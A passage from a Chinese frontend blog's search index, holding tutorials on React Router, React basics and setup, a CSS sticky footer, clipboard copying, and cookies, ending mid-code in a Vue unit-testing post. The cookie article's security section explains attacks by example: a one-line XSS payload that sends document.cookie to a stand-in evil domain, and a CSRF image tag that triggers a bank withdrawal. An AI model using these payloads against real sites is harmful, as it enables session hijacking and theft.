Router概览","url":"%2Freact-router-overview%2F","content":"\n# 概述\n本文是对react-router4.x的一个概览（web应用部分），不涉及具体编码细节，只作脉络梳理。\n<!-- more -->\n\n# 详述\nReact Router是一组导航组件，支持Web应用与React Native应用。对应的npm包为`react-router-dom`与`react-router-native`，两者都集成了核心包`react-router`。在web分支，最基本的三个组件是总容器组件`BrowserRouter`、占位组件`Route`和链接导航组件`Link`，总容器包裹整个需要导航的组件，一般包裹所有应用组件；占位组件定义了路由匹配规则及符合规则的组件渲染于此；链接导航组件的原型是a标签，定义了路由名称及对应句柄展示内容。\n\n## 基本示例\n```js\nimport React from \"react\";\nimport { BrowserRouter as Router, Route, Link } from \"react-router-dom\";\n\nfunction Index() {\n  return <h2>Home</h2>;\n}\n\nfunction About() {\n  return <h2>About</h2>;\n}\n\nfunction Users() {\n  return <h2>Users</h2>;\n}\n\nfunction AppRouter() {\n  return (\n    <Router>\n      <div>\n        <nav>\n          <ul>\n            <li>\n              <Link to=\"/\">Home</Link>\n            </li>\n            <li>\n              <Link to=\"/about/\">About</Link>\n            </li>\n            <li>\n              <Link to=\"/users/\">Users</Link>\n            </li>\n          </ul>\n        </nav>\n\n        <Route path=\"/\" exact component={Index} />\n        <Route path=\"/about/\" component={About} />\n        <Route path=\"/users/\" component={Users} />\n      </div>\n    </Router>\n  );\n}\n\nexport default AppRouter;\n\n```\n## API\n- `<Router>`：所有路由器组件的通用底层接口。通常情况下，应用程序会使用其中一种高级路由器:`<BrowserRouter>、<HashRouter>、<MemoryRouter>、<NativeRouter>、<StaticRouter>`。\n- `<BrowserRouter>`：使用HTML5 history API的路由实现。\n- `<HashRouter>`：使用URL的hash特性的路由实现。\n- `<MemoryRouter>`：<Router>的一种实现，它将您的“URL”的历史记录保存在内存中(不读取或写入地址栏)。在测试和非浏览器环境(如React Native)中非常有用。\n- `<StaticRouter>`：`<Router>`的一种实现，一个从不改变位置的<路由器>，在服务器端和单元测试中很有用。\n- `<Link>`：提供声明性的、可访问的导航。\n- `<NavLink>`：特殊的`<Link>`，当它匹配当前URL时，将向呈现的元素添加样式属性。\n- `<Redirect>`：导航到一个新的位置，类别服务器端的重定向。\n- `<Route>`：核心组件，最基本的职责是在位置与路由路径匹配时呈现一些UI。\n- `<Switch>`：呈现与位置匹配的第一个子节点`<Route>`或`<Redirect>`。\n- `<Prompt>`：用于在离开页面之前提示用户。当您的应用程序进入一种应该防止用户导航离开的状态(就像表单只填写了一半)时，呈现一个<Prompt>。\n- history：待完善\n- location：待完善\n- match：待完善\n- matchPath：待完善\n- withRouter：待完善\n# 参考\n","tags":["React"],"categories":["框架与库"]},{"title":"React基础知识","url":"%2Freact-basic%2F","content":"\n# 概述\n\n对 React 的基础知识作一个总结。\n\n<!-- more -->\n\n# 详述\n\n## Hello World\n\n```js\nReactDOM.render(<h1>Hello, world!</h1>, document.getElementById('root'));\n```\n\n## JSX\n\n不是新事物，而是一种语法糖，Babel 转译后调用 React.createElement() ，因此具有 JavaScript 的全部功能。\n\n类似一些前端模板引擎的语法，JSX 中用大括号`{}`来包裹 JavaScript 变量和表达式。\n\n属性用 camelCase 命名法，例如 class-className、tabindex-tabIndex。属性值如果是字符串值直接用引号，如果是表达式用大括号。\n\n```js\n// 引用变量\nconst name = 'Josh Perez';\nconst element = <h1>Hello, {name}</h1>;\n\n// 引用表达式\nfunction formatName(user) {\n  return user.firstName + ' ' + user.lastName;\n}\n\nconst user = {\n  firstName: 'Harper',\n  lastName: 'Perez'\n};\n\nconst element = <h1>Hello, {formatName(user)}!</h1>;\n\nReactDOM.render(element, document.getElementById('root'));\n\n// 属性值为字符串\nconst element = <div tabIndex=\"0\" />;\n\n// 属性值为表达式\nconst element = <img src={user.avatarUrl} />;\n\n// 需要把 CSS 属性变成一个对象再传给元素\nconst element = <h1 style={{ fontSize: '12px', color: 'red' }}>hello react</h1>;\n```\n\n## 元素\n\n元素是构成 React 应用的最小砖块。React 元素是不可变对象。一旦被创建，你就无法更改它的子元素或者属性。一个元素就像电影的单帧：它代表了某个特定时刻的 UI。更新 UI 唯一的方式是创建一个全新的元素，并将其传入 ReactDOM.render()。\n\n## 组件\n\n组件是独立可复用的代码片段，由一个或多个元素组成，是根据 UI 需要对元素的进一步抽象封装，因此可以自由的拆分组合使用，就像使用 HTML 元素那样。形式上分为函数组件和 class 组件，一般不需要维护私有状态 state 的，推荐用函数组件。\n\n```js\n// 函数组件\nfunction Welcome(props) {\n  return <h1>Hello, {props.name}</h1>;\n}\n// class组件\nclass Welcome extends React.Component {\n  render() {\n    return <h1>Hello, {this.props.name}</h1>;\n  }\n}\n// 组件的组合使用\nfunction Avatar(props) {\n  return (\n    <img className=\"Avatar\" src={props.user.avatarUrl} alt={props.user.name} />\n  );\n}\nfunction UserInfo(props) {\n  return (\n    <div className=\"UserInfo\">\n      <Avatar user={props.user} />\n      <div className=\"UserInfo-name\">{props.user.name}</div>\n    </div>\n  );\n}\nfunction Comment(props) {\n  return (\n    <div className=\"Comment\">\n      <UserInfo user={props.author} />\n      <div className=\"Comment-text\">{props.text}</div>\n      <div className=\"Comment-date\">{formatDate(props.date)}</div>\n    </div>\n  );\n}\n```\n\n## Props 与 State\n\n组件可以把它的 state 作为 props 向下传递到它的子组件中，而子组件不能直接修改 props，只能通过事件通知父级修改；state 是记录自身状态的私有属性，可以修改。这种数据流向是“自上而下”的，一般称为单向数据流。\n\nprops.children 可以理解为插槽。\n\nstate 修改需要注意三点：\n\n1. 不要直接修改 State，而是调用 `setState()`方法；\n2. State 的更新可能是异步的，因此不能依赖当前状态去更新下一个状态；\n3. State 的更新会被合并。\n\n## 生命周期\n\n组件的生命周期图谱如下：\n![生命周期图谱](life.jpg)\n通常在 constructor 中进行 state 等初始化工作，componentDidMount 中进行 DOM 渲染完成后的工作，componentWillUnmount 中进行资源释放工作。示例如下：\n\n```js\nclass Clock extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { date: new Date() };\n  }\n\n  componentDidMount() {\n    this.timerID = setInterval(() => this.tick(), 1000);\n  }\n\n  componentWillUnmount() {\n    clearInterval(this.timerID);\n  }\n\n  tick() {\n    this.setState({\n      date: new Date()\n    });\n  }\n\n  render() {\n    return (\n      <div>\n        <h1>Hello, world!</h1>\n        <h2>It is {this.state.date.toLocaleTimeString()}.</h2>\n      </div>\n    );\n  }\n}\n\nReactDOM.render(<Clock />, document.getElementById('root'));\n```\n\n更多生命周期介绍请参考[官方文档](http://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/)。\n\n## 事件处理\n\nReact 元素的事件处理和 DOM 元素的很相似，但是有一点语法上的不同:\n\n- React 事件的命名采用小驼峰式（camelCase），而不是纯小写。\n- 使用 JSX 语法时你需要传入一个函数作为事件处理函数，而不是一个字符串。\n\n```js\n<button onClick={activateLasers}>Activate Lasers</button>\n```\n\n### 注意事项：\n\n#### 不能通过放回 false 的方式组织默认行为，而是要显式的使用 preventDefault\n\n```html\n<!-- 错误 -->\n<a href=\"#\" onclick=\"console.log('The link was clicked.'); return false\">\n  Click me\n</a>\n```\n\n```js\n// 正确\nfunction ActionLink() {\n  function handleClick(e) {\n    e.preventDefault();\n    console.log('The link was clicked.');\n  }\n\n  return (\n    <a href=\"#\" onClick={handleClick}>\n      Click me\n    </a>\n  );\n}\n```\n\n#### 回调函数中的 this 绑定问题\n\n因为传入的回调函数在调用的时候上下文（context）已经不是该组件实例本身，所以想要 this 指向该组件实例本身，需要传入的时候显式的指定上下文。\n\nbind 用法：\n\n```js\nclass Title extends Component {\n  handleClickOnTitle(e) {\n    console.log(this);\n  }\n\n  render() {\n    return <h1 onClick={this.handleClickOnTitle.bind(this)}>React 小书</h1>;\n  }\n}\n```\n\nclass fields 用法（Create React App 默认启用此语法）：\n\n```js\nclass LoggingButton extends React.Component {\n  // 此语法确保 `handleClick` 内的 `this` 已被绑定。\n  // 注意: 这是 *实验性* 语法。\n  handleClick = () => {\n    console.log('this is:', this);\n  };\n\n  render() {\n    return <button onClick={this.handleClick}>Click me</button>;\n  }\n}\n```\n\n箭头函数用法：\n\n```js\nclass LoggingButton extends React.Component {\n  handleClick() {\n    console.log('this is:', this);\n  }\n\n  render() {\n    // 此语法确保 `handleClick` 内的 `this` 已被绑定。\n    return <button onClick={e => this.handleClick(e)}>Click me</button>;\n  }\n}\n```\n\n## 条件渲染与列表\n\nJSX 只是 JavaScript 的语法糖，可以完全使用 JavaScript 特性。对于列表渲染，需要在加上 key，值只要保证兄弟节点间唯一即可。\n\n## 表单\n\n### 受控组件\n\n表单数据由 React 组件来管理。具体实现形式如下：\n\n```js\nclass NameForm extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { value: '' };\n\n    this.handleChange = this.handleChange.bind(this);\n    this.handleSubmit = this.handleSubmit.bind(this);\n  }\n\n  handleChange(event) {\n    this.setState({ value: event.target.value });\n  }\n\n  handleSubmit(event) {\n    alert('提交的名字: ' + this.state.value);\n    event.preventDefault();\n  }\n\n  render() {\n    return (\n      <form onSubmit={this.handleSubmit}>\n        <label>\n          名字:\n          <input\n            type=\"text\"\n            value={this.state.value}\n            onChange={this.handleChange}\n          />\n        </label>\n        <input type=\"submit\" value=\"提交\" />\n      </form>\n    );\n  }\n}\n```\n\n作为受控组件，`<textarea>` 和 `<select>`元素赋值形式做了调整，改成与 input 相同，如下：\n\n```js\n\n<textarea value={this.state.value} onChange={this.handleChange} />\n\n<select value={this.state.value} onChange={this.handleChange}>\n  <option value=\"grapefruit\">葡萄柚</option>\n  <option value=\"lime\">酸橙</option>\n  <option value=\"coconut\">椰子</option>\n  <option value=\"mango\">芒果</option>\n</select>\n```\n\n注意点：\n\n文件 input 标签为非受控组件`<input type=\"file\" />`。\n\n设置了 value 值的受控组件是不可编辑的，若仍然可编辑，那可能是 value 值为 undefined 或 null。\n\n### 非受控组件\n\n将在高级部分讲解，[官方文档](https://zh-hans.reactjs.org/docs/uncontrolled-components.html)。\n\n## 状态提升\n\n通常，多个组件需要反映相同的变化数据，这时我们建议将共享状态提升到最近的共同父组件中去。\n\n## 组合 vs 继承\n\nReact 有十分强大的组合模式。我们推荐使用组合而非继承来实现组件间的代码重用。\n\n### 包含关系\n\n概念同 Vue 的插槽\n\n```js\n// 匿名\nfunction FancyBorder(props) {\n  return (\n    <div className={'FancyBorder FancyBorder-' + props.color}>\n      {props.children}\n    </div>\n  );\n}\nfunction WelcomeDialog() {\n  return (\n    <FancyBorder color=\"blue\">\n      <h1 className=\"Dialog-title\">Welcome</h1>\n      <p className=\"Dialog-message\">Thank you for visiting our spacecraft!</p>\n    </FancyBorder>\n  );\n}\n// 具名\nfunction SplitPane(props) {\n  return (\n    <div className=\"SplitPane\">\n      <div className=\"SplitPane-left\">{props.left}</div>\n      <div className=\"SplitPane-right\">{props.right}</div>\n    </div>\n  );\n}\nfunction App() {\n  return <SplitPane left={<Contacts />} right={<Chat />} />;\n}\n```\n\n# 参考\n\nhttp://huziketang.mangojuice.top/books/react/lesson9\n\nhttps://zh-hans.reactjs.org/docs/introducing-jsx.html\n","tags":["React"],"categories":["框架与库"]},{"title":"React安装使用","url":"%2Freact-hello%2F","content":"\n# 概述\n\n介绍 React 的各种安装使用方式，从网页直接使用，到脚手架，再到用打包工具webpack自己搭建。\n\n<!-- more -->\n\n# 详述\n\n## 安装\n\n### 网页中直接使用\n\n一个 DOM 容器，一个 React 组件，三个 Script 标签。\n\n```html\n<!-- ... 其它 HTML ... -->\n\n<div id=\"like_button_container\"></div>\n\n<!-- ... 其它 HTML ... -->\n```\n\n```js\n'use strict';\n\nconst e = React.createElement;\n\nclass LikeButton extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { liked: false };\n  }\n\n  render() {\n    if (this.state.liked) {\n      return 'You liked this.';\n    }\n\n    return e(\n      'button',\n      { onClick: () => this.setState({ liked: true }) },\n      'Like'\n    );\n  }\n}\n\nconst domContainer = document.querySelector('#like_button_container');\nReactDOM.render(e(LikeButton), domContainer);\n```\n\n```html\n  <!-- ... 其它 HTML ... -->\n\n  <!-- 加载 React。-->\n  <!-- 注意: 部署时，将 \"development.js\" 替换为 \"production.min.js\"。-->\n  <script src=\"https://unpkg.com/react@16/umd/react.development.js\" crossorigin></script>\n  <script src=\"https://unpkg.com/react-dom@16/umd/react-dom.development.js\" crossorigin></script>\n\n  <!-- 加载我们的 React 组件。-->\n  <script src=\"like_button.js\"></script>\n\n</body>\n```\n\n#### 可选使用 JSX\n\n```js\n// 显示一个 \"Like\" <button>\nreturn <button onClick={() => this.setState({ liked: true })}>Like</button>;\n```\n\n```shell\nnpm init -y\nnpm install babel-cli@6 babel-preset-react-app@3\n\nnpx babel --watch src --out-dir . --presets react-app/prod\n```\n\n### 创建新的 React 应用\n\n#### Create React App 脚手架\n\n```shell\nnpx create-react-app my-app\ncd my-app\nnpm start\n```\n\n#### webpack 从零搭建\n\n```json\n// package.json\n  \"devDependencies\": {\n    \"@babel/core\": \"^7.4.5\",\n    \"@babel/plugin-transform-runtime\": \"^7.4.4\",\n    \"@babel/preset-env\": \"^7.4.5\",\n    \"@babel/preset-react\": \"^7.0.0\",\n    \"babel-loader\": \"^8.0.6\",\n    \"html-webpack-plugin\": \"^3.2.0\",\n    \"react-redux\": \"^7.1.0\",\n    \"react-router-dom\": \"^5.0.1\",\n    \"redux\": \"^4.0.1\",\n    \"redux-saga\": \"^1.0.4\",\n    \"webpack\": \"^4.35.0\",\n    \"webpack-cli\": \"^3.3.5\",\n    \"webpack-dev-server\": \"^3.7.2\"\n  },\n  \"dependencies\": {\n    \"react\": \"^16.8.6\",\n    \"react-dom\": \"^16.8.6\"\n  }\n```\n\n```json\n// .babelrc\n{\n  \"presets\": [\"@babel/preset-env\", \"@babel/preset-react\"],\n  \"plugins\": [\n    [\n      \"@babel/plugin-transform-runtime\",\n      {\n        \"corejs\": false,\n        \"helpers\": true,\n        \"regenerator\": true,\n        \"useESModules\": false\n      }\n    ]\n  ]\n}\n```\n\n```js\n// webpack.config.js\n  module: {\n    rules: [\n      {\n        test: /\\.js$/,\n        exclude: /node_modules/,\n        use: {\n          loader: 'babel-loader'\n        }\n      }\n    ]\n  },\n```\n\n# 参考\n\nhttps://zh-hans.reactjs.org/docs/getting-started.html\n","tags":["React"],"categories":["框架与库"]},{"title":"页脚居底最简单实现","url":"%2Ffooter-bottom%2F","content":"\n# 概述\n\n仅用简单的 css 实现页脚始终居于页面底部。主要知识点为`min-height:100%`和`box-sizing:border-box`。\n\n<!-- more -->\n\n# 详述\n\n## 直接看代码：\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <title>页脚居底最简单实现</title>\n    <style>\n      /* reset */\n      body {\n        margin: 0;\n        padding: 0;\n      }\n      header {\n        height: 80px;\n        background-color: antiquewhite;\n      }\n      footer {\n        height: 60px;\n        background-color: brown;\n      }\n\n      /* 核心实现部分 */\n      html {\n        height: 100%;\n      }\n      body {\n        position: relative;\n        min-height: 100%;\n        box-sizing: border-box; /* 设置高度包括padding */\n        padding-bottom: 60px; /* footer 的高度，为 footer 占位 */\n      }\n      footer {\n        position: absolute;\n        bottom: 0;\n        left: 0;\n        width: 100%;\n        height: 60px;\n      }\n    </style>\n  </head>\n  <body>\n    <header>this is header content</header>\n    <section>this is main content</section>\n    <footer>this is footer content</footer>\n  </body>\n</html>\n```\n\n## 注意点一\n\n设置 body 的`min-height: 100%;`需要设置 html 的高度为 100%。\n\n## 注意点二\n\nCSS 中的 box-sizing 属性定义了宿主环境应该如何计算一个元素的总宽度和总高度。\n\n在 CSS 盒子模型的默认定义里，你对一个元素所设置的 width 与 height 只会应用到这个元素的内容区。如果这个元素有任何的 border 或 padding ，绘制到屏幕上时的盒子宽度和高度会加上设置的边框和内边距值。这意味着当你调整一个元素的宽度和高度时需要时刻注意到这个元素的边框和内边距。当我们实现响应式布局时，这个特点尤其烦人。\n\nbox-sizing 属性可以被用来调整这些表现:\n\n- content-box 是默认值。如果你设置一个元素的宽为 100px，那么这个元素的内容区会有 100px 宽，并且任何边框和内边距的宽度都会被增加到最后绘制出来的元素宽度中。\n- border-box 告诉浏览器：你想要设置的边框和内边距的值是包含在 width 内的。也就是说，如果你将一个元素的 width 设为 100px，那么这 100px 会包含它的 border 和 padding，内容区的实际宽度是 width 减去(border + padding)的值。大多数情况下，这使得我们更容易地设定一个元素的宽高。\n\n# 参考\n\nhttps://developer.mozilla.org/zh-CN/docs/Web/CSS/box-sizing\n","tags":["CSS"],"categories":["前端"]},{"title":"js复制文本到剪贴板","url":"%2Fjs-copy%2F","content":"\n# 概述\n\n实现点击按钮复制指定的内容到黏贴板，主要涉及两个 API`element.select()`和`document.execCommand()`。本文将介绍基本实现及常见坑，最后是推荐一个不错的第三方库。\n![示例图](demo.jpg)\n\n<!-- more -->\n\n# 详述\n\n实际场景是：系统要提供一个批量上传商品的功能，但是上传的 Excel 文件中需要制定商品属于哪个类目，因此需要提供一个交互是用户选择类目然后可点击按钮复制类目码。示例图如上。\n\n## select 方法\n\nselect() 方法用于选择该元素中的文本。\n\n### 语法\n\n```js\ntextareaObject.select();\n```\n\n### 注意点\n\n该元素为可编辑文本的元素，如 textarea、input([type=text])，因此常见坑有：\n\n1. 该元素设置了 hidden 属性；\n2. 该元素设置了 disabled 属性；\n3. 该元素为`<input type=\"hidden\">`；\n4. input 元素的 width 或者 height 为 0；\n\n## execCommand 方法\n\n当一个 HTML 文档切换到设计模式时，document 暴露 execCommand 方法，该方法允许运行命令来操纵可编辑内容区域的元素。\n\n### 语法\n\n```js\nbool = document.execCommand(aCommandName, aShowDefaultUI, aValueArgument);\n```\n\naCommandName：一个 DOMString ，命令的名称。可用命令列表请参阅 [命令](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/execCommand#%E5%91%BD%E4%BB%A4) 。\n\naShowDefaultUI：一个 Boolean， 是否展示用户界面，一般为 false。Mozilla 没有实现。\n\naValueArgument：一些命令（例如 insertImage）需要额外的参数（insertImage 需要提供插入 image 的 url），默认为 null。\n\n## 实现点击复制示例\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <title>js复制</title>\n  </head>\n  <body>\n    <textarea id=\"text\" style=\"width: 0\">hello JovySun</textarea>\n    <!-- <input type=\"text\" value=\"hello JovySun\" id=\"text\" hidden> -->\n    <button id=\"btn\">click</button>\n    <script>\n      window.onload = function(event) {\n        var button = document.getElementById(\"btn\");\n        button.onclick = function(event) {\n          document.getElementById(\"text\").select();\n          document.execCommand(\"copy\", false, null);\n        };\n      };\n    </script>\n  </body>\n</html>\n```\n\n## 第三方库\n\n[clipboardjs](https://clipboardjs.com/)，一种将文本复制到剪贴板的现代方法，无其他依赖，gzipe 压缩后只有 3kb。\n\n提供从其他元素复制，剪切文本，或者从自身属性复制文本的方法，另外也提供了 success 和 error 自定义事件方便你作进一步的交互反馈。\n\n浏览器支持 IE9+及其他所有主流现代浏览器。\n","tags":["JavaScript"],"categories":["前端"]},{"title":"Cookie一箩筐","url":"%2Fcookie%2F","content":"\n# 概述\n\nHTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。\n\n<!-- more -->\n\nCookie 主要用于以下三个方面：\n\n- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）\n- 个性化设置（如用户自定义设置、主题等）\n- 浏览器行为跟踪（如跟踪分析用户行为等）\n\nCookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器 API 已经允许开发者直接将数据存储到本地，如使用 Web storage API （本地存储和会话存储）或 IndexedDB 。\n\n# 详述\n\n## 创建 Cookie\n\n当服务器收到 HTTP 请求时，服务器可以在响应头里面添加一个 Set-Cookie 选项。浏览器收到响应后通常会保存下 Cookie，之后对该服务器每一次请求中都通过 Cookie 请求头部将 Cookie 信息发送给服务器。另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。\n\n### Set-Cookie 响应头部和 Cookie 请求头部\n\n服务器使用`Set-Cookie`响应头部向用户代理（一般是浏览器）发送 Cookie 信息。一个简单的 Cookie 可能像这样：\n\n```\nSet-Cookie: <cookie名>=<cookie值>\n```\n\n服务器通过该头部告知客户端**保存**Cookie 信息。\n\n对于服务端程序中设置 Set-Cookie 响应头信息，不同语言有各自的语法，Node.JS 示例如下：\n\n```js\nresponse.setHeader(\"Set-Cookie\", [\"type=ninja\", \"language=javascript\"]);\n```\n\n响应头示例：\n\n```\nHTTP/1.0 200 OK\nContent-type: text/html\nSet-Cookie: yummy_cookie=choco\nSet-Cookie: tasty_cookie=strawberry\n```\n\n下一次的请求头示例：\n\n```\nGET /sample_page.html HTTP/1.1\nHost: www.example.org\nCookie: yummy_cookie=choco; tasty_cookie=strawberry\n```\n\n## 几个概念\n\n会话期 Cookie：浏览器关闭自动删除 cookie。\n\n持久性 Cookie：指定一个特定的过期时间（Expires）或有效期（Max-Age）。\n\nCookie 的 Secure 标记：Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端。\n\nCookie 的 HttpOnly 标记：只能发送给服务端而不能被 JavaScript 脚本调用。\n\nCookie 的作用域：Domain 和 Path 标识定义了 Cookie 的作用域，即 Cookie 应该发送给哪些 URL。\n\nJavaScript 调用：通过 Document.cookie 属性可创建新的 Cookie，也可通过该属性访问非 HttpOnly 标记的 Cookie。\n\n## 安全\n\n> 当机器处于不安全环境时，切记不能通过 HTTP Cookie 存储、传输敏感信息。\n\n### 会话劫持和 XSS\n\n```\n(new Image()).src = \"http://www.evil-domain.com/steal-cookie.php?cookie=\" + document.cookie;\n```\n\n### 跨站请求伪造（CSRF）\n\n比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：\n\n```html\n<img\n  src=\"http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory\"\n/>\n```\n\n当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：\n\n- 对用户输入进行过滤来阻止 XSS；\n- 任何敏感操作都需要确认；\n- 用于敏感信息的 Cookie 只能拥有较短的生命周期；\n- 更多方法可以查看[OWASP CSRF prevention cheat sheet](<https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet>)。\n\n## 封装一个 cookie 使用库\n\n写入一个 cookie：`docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])`\n\n获取一个 cookie：`docCookies.getItem(name)`\n\n移除一个 cookie：`docCookies.removeItem(name[, path[, domain]])`\n\n检查一个 cookie（是否存在）：`docCookies.hasItem(name)`\n\n获取所有 cookie 列表：`docCookies.keys()`\n\n```js\n/*\\\n|*|\n|*|  :: cookies.js ::\n|*|\n|*|  A complete cookies reader/writer framework with full unicode support.\n|*|\n|*|  Revision #1 - September 4, 2014\n|*|\n|*|  https://developer.mozilla.org/en-US/docs/Web/API/document.cookie\n|*|  https://developer.mozilla.org/User:fusionchess\n|*|  https://github.com/madmurphy/cookies.js\n|*|\n|*|  This framework is released under the GNU Public License, version 3 or later.\n|*|  http://www.gnu.org/licenses/gpl-3.0-standalone.html\n|*|\n|*|  Syntaxes:\n|*|\n|*|  * docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])\n|*|  * docCookies.getItem(name)\n|*|  * docCookies.removeItem(name[, path[, domain]])\n|*|  * docCookies.hasItem(name)\n|*|  * docCookies.keys()\n|*|\n\\*/\n\nvar docCookies = {\n  getItem: function(sKey) {\n    if (!sKey) {\n      return null;\n    }\n    return (\n      decodeURIComponent(\n        document.cookie.replace(\n          new RegExp(\n            \"(?:(?:^|.*;)\\\\s*\" +\n              encodeURIComponent(sKey).replace(/[\\-\\.\\+\\*]/g, \"\\\\$&\") +\n              \"\\\\s*\\\\=\\\\s*([^;]*).*$)|^.*$\"\n          ),\n          \"$1\"\n        )\n      ) || null\n    );\n  },\n  setItem: function(sKey, sValue, vEnd, sPath, sDomain, bSecure) {\n    if (!sKey || /^(?:expires|max\\-age|path|domain|secure)$/i.test(sKey)) {\n      return false;\n    }\n    var sExpires = \"\";\n    if (vEnd) {\n      switch (vEnd.constructor) {\n        case Number:\n          sExpires =\n            vEnd === Infinity\n              ? \"; expires=Fri, 31 Dec 9999 23:59:59 GMT\"\n              : \"; max-age=\" + vEnd;\n          break;\n        case String:\n          sExpires = \"; expires=\" + vEnd;\n          break;\n        case Date:\n          sExpires = \"; expires=\" + vEnd.toUTCString();\n          break;\n      }\n    }\n    document.cookie =\n      encodeURIComponent(sKey) +\n      \"=\" +\n      encodeURIComponent(sValue) +\n      sExpires +\n      (sDomain ? \"; domain=\" + sDomain : \"\") +\n      (sPath ? \"; path=\" + sPath : \"\") +\n      (bSecure ? \"; secure\" : \"\");\n    return true;\n  },\n  removeItem: function(sKey, sPath, sDomain) {\n    if (!this.hasItem(sKey)) {\n      return false;\n    }\n    document.cookie =\n      encodeURIComponent(sKey) +\n      \"=; expires=Thu, 01 Jan 1970 00:00:00 GMT\" +\n      (sDomain ? \"; domain=\" + sDomain : \"\") +\n      (sPath ? \"; path=\" + sPath : \"\");\n    return true;\n  },\n  hasItem: function(sKey) {\n    if (!sKey) {\n      return false;\n    }\n    return new RegExp(\n      \"(?:^|;\\\\s*)\" +\n        encodeURIComponent(sKey).replace(/[\\-\\.\\+\\*]/g, \"\\\\$&\") +\n        \"\\\\s*\\\\=\"\n    ).test(document.cookie);\n  },\n  keys: function() {\n    var aKeys = document.cookie\n      .replace(/((?:^|\\s*;)[^\\=]+)(?=;|$)|^\\s*|\\s*(?:\\=[^;]*)?(?:\\1|$)/g, \"\")\n      .split(/\\s*(?:\\=[^;]*)?;\\s*/);\n    for (var nLen = aKeys.length, nIdx = 0; nIdx < nLen; nIdx++) {\n      aKeys[nIdx] = decodeURIComponent(aKeys[nIdx]);\n    }\n    return aKeys;\n  }\n};\n```\n\n## 第三方库\n\n[jquery.cookie.js](https://github.com/carhartl/jquery-cookie#readme)官方已停止维护，并推荐使用全新的[js-cookie](https://github.com/js-cookie/js-cookie)。\n\n### js-cookie\n\n```js\n// 创建一个cookie，在整个网站有效\nCookies.set(\"name\", \"value\");\n// 创建一个cookie，有效期为7天，整个网站有效\nCookies.set(\"name\", \"value\", { expires: 7 });\n// 创建一个cookie，有效期7天，当前路径有效\nCookies.set(\"name\", \"value\", { expires: 7, path: \"\" });\n\n// 读取\nCookies.get(\"name\"); // => 'value'\nCookies.get(\"nothing\"); // => undefined\n// 读取所有\nCookies.get(); // => { name: 'value' }\n// 通过设置domain或者path来读取特定cookie是不起效果的\nCookies.get(\"foo\", { domain: \"sub.example.com\" }); // `domain` won't have any effect...!\n// 删除\nCookies.remove(\"name\");\n// 对于设置了domain或者path的cookie，删除时也必须配置相应的属性参数\nCookies.set(\"name\", \"value\", { path: \"\" });\nCookies.remove(\"name\"); // fail!\nCookies.remove(\"name\", { path: \"\" }); // removed!\n\nCookies.remove(\"name\", { path: \"\", domain: \".yourdomain.com\" });\n```\n\n### jquery.cookie.js\n\n使用逻辑与 `js-cookie` 一致\n\n```js\n// Create session cookie:\n$.cookie(\"name\", \"value\");\n\n// Create expiring cookie, 7 days from then:\n$.cookie(\"name\", \"value\", { expires: 7 });\n\n// Create expiring cookie, valid across entire site:\n$.cookie(\"name\", \"value\", { expires: 7, path: \"/\" });\n\n// Read cookie:\n$.cookie(\"name\"); // => \"value\"\n$.cookie(\"nothing\"); // => undefined\n\n// Read all available cookies:\n$.cookie(); // => { \"name\": \"value\" }\n\n// Delete cookie:\n\n// Returns true when cookie was successfully deleted, otherwise false\n$.removeCookie(\"name\"); // => true\n$.removeCookie(\"nothing\"); // => false\n\n// Need to use the same attributes (path, domain) as what the cookie was written with\n$.cookie(\"name\", \"value\", { path: \"/\" });\n// This won't work!\n$.removeCookie(\"name\"); // => false\n// This will work!\n$.removeCookie(\"name\", { path: \"/\" }); // => true\n\n// Note: when deleting a cookie, you must pass the exact same path, domain and secure options that were used to set the cookie, unless you're relying on the default options that is.\n```\n\n## 实践场景\n\n系统升级后，对于历史 B 类买家，第一次登陆系统后在对应的承载页给出弹框提示。\n实现思路：登陆时后端根据账户数据判断出是否为符合条件的用户，符合则在响应头中设置 cookie 值，前端页面加载时获取对应的 cookie 值，判断是否需要显示弹框。弹框确认关闭后清除 cookie。\n\n# 参考\n\nhttps://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies\n\nhttps://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie/Simple_document.cookie_framework\n","tags":["基础"],"categories":["其他"]},{"title":"Vue实战@单元测试","url":"%2Fvue-in-action-unitTest%2F","content":"\n# 概述\n\n单元测试在日常开发中可能使用率不高，但是对于功能性的模块，开源的项目就显得非常必要了。Vue CLI 拥有开箱即用的通过 Jest 或 Mocha 进行单元测试的内置选项。本次我们在用 cli 建项目的时候选择了 Jest 方式，因此本文说下在 Vue CLI 构建的项目中 Jest 的使用。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n## 待测代码\n\n```js\n// src/auth.js\nconst currentAuth = [\"admin\"];\nexport { currentAuth };\n\nexport function getCurrentAuthority() {\n  return 